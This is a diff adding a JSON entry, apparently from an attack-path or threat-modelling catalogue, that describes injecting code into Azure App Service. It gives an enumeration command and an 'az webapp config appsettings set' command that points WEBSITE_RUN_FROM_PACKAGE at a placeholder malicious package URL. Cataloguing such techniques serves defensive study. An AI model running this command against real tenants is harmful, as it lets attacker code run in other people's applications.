@@ -1,0 +1,36 @@
+{
+    "title": "Exploit Application Configuration to Inject Malicious Code",
+    "icon": "https://img.icons8.com/?size=100&id=44471&format=png&color=000000",
+    "nodes": [
+        {
+            "id": 1,
+            "label": "Attacker",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/hacker.png",
+            "details": {}
+        },
+        {
+            "id": 2,
+            "label": "List App Services",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/app.png",
+            "details": {
+                "command": "az webapp list --resource-group <ResourceGroupName>",
+                "description": "Lists all app services in the specified resource group.",
+                "services": ["AppService"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.microsoft.com/en-us/cli/azure/webapp?view=azure-cli-latest#az-webapp-list"
+            }
+        },
+        {
+            "id": 3,
+            "label": "Configure App Settings",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/settings.png",
+            "details": {
+                "command": "az webapp config appsettings set --resource-group <ResourceGroupName> --name <AppName> --settings 'WEBSITE_RUN_FROM_PACKAGE=https://<URLToMaliciousPackage>'",
+                "description": "Configures the app settings to load a malicious package.",
+                "services": ["AppService"],
+                "attack_types": ["Code Injection"],
+                "references": "https://docs.microsoft.com/en-us/cli/azure/webapp/config/appsettings?view=azure-cli-latest#az-webapp-config-appsettings-set"
+            }
+        }
+    ]
+}
